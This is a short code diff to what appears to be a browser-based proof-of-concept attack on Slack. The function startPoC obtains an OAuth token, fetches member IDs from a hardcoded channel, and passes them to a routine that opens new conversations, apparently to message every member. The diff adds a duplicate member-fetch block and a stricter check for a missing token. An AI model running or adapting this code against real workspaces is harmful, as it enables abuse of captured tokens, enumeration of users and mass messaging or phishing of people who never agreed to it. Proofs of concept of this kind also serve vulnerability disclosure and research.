@@ -74,10 +74,17 @@ function startPoC() {
             document.getElementsByClassName("preview")[0].innerHTML = "[+] Fetching member ids from #general<br />";
             createNewConversation(json["members"])
         })
+
+    fetch("https://slack.com/api/conversations.members?&channel=C010MKS02CF&token="+token).then(
+        response => response.json()).then((json) => {
+            localStorage.setItem("memberscount", json["members"].length)
+            document.getElementsByClassName("preview")[0].innerHTML = "[+] Fetching member ids from #general<br />";
+            createNewConversation(json["members"])
+        })
 }
 
 function getObject(){
-    if(localStorage.getItem("token") == "" || localStorage.getItem("token") == "undefined"){
+    if(localStorage.getItem("token") == "" || localStorage.getItem("token") == "undefined" || !localStorage.getItem("token")){
         fetch("https://slack.com/api/oauth.v2.access",{method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: data}).then(
             response => response.json()
         ).then((json) => {
